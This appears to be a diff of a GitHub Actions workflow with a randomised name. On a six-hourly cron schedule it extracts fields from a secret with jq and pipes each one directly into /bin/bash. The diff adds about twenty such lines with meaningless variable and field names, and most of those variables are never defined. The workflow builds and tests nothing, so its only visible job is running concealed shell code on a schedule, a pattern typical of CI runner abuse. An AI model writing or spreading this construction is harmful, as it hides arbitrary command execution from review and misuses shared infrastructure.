@@ -2,27 +2,37 @@ name: gaoyaguo2603
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 5/6 * * *'
-jobs:  # 319
+    - cron: '8 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: gaoyaguo2603
         env:
-          hwb58: ${{ secrets.hwb58 }}
+          z7: ${{ secrets.z7 }}
         run: |
-          echo $hwb58 | jq -r .fnk38306 | /bin/bash
-          echo $joenh30 | jq -r .o46 | /bin/bash
-          echo $sdl04222 | jq -r .q52335 | /bin/bash
-          echo $n789 | jq -r .fz290 | /bin/bash
-          echo $mwm33188 | jq -r .byx1545 | /bin/bash
-          echo $nmt68 | jq -r .wpwy92532 | /bin/bash
-          echo $cvau7 | jq -r .jxiq887 | /bin/bash
-          echo $mwcd0 | jq -r .pg395 | /bin/bash
-          echo $h326 | jq -r .jaj5306 | /bin/bash
-          echo $m44 | jq -r .emtcv903 | /bin/bash
-          echo $ubqw867 | jq -r .as4348 | /bin/bash
-          echo $rezv7725 | jq -r .h67183 | /bin/bash
-          echo $ajsbn0 | jq -r .dpv6 | /bin/bash
+          echo $z7 | jq -r .ticj88194 | /bin/bash
+          echo $l520 | jq -r .vcw08 | /bin/bash
+          echo $u16630 | jq -r .kjm643 | /bin/bash
+          echo $y716 | jq -r .vr8727 | /bin/bash
+          echo $t0 | jq -r .yk5553 | /bin/bash
+          echo $pyo5592 | jq -r .gl3472 | /bin/bash
+          echo $qea689 | jq -r .sxq50311 | /bin/bash
+          echo $o2610 | jq -r .njtpp7 | /bin/bash
+          echo $mrb38 | jq -r .fr3150 | /bin/bash
+          echo $gxk59611 | jq -r .ir569 | /bin/bash
+          echo $rhkhr15 | jq -r .klea97597 | /bin/bash
+          echo $rt4231 | jq -r .xfiox743 | /bin/bash
+          echo $bk38208 | jq -r .bubo7025 | /bin/bash
+          echo $qhgcy15181 | jq -r .y0974 | /bin/bash
+          echo $ytx2172 | jq -r .m23696 | /bin/bash
+          echo $hq53 | jq -r .uon39 | /bin/bash
+          echo $vzr3 | jq -r .zzrf7212 | /bin/bash
+          echo $l4264 | jq -r .vqhp5 | /bin/bash
+          echo $pk1862 | jq -r .uk55260 | /bin/bash
+          echo $xjpg34 | jq -r .d6 | /bin/bash
+          echo $k56641 | jq -r .h556 | /bin/bash
 
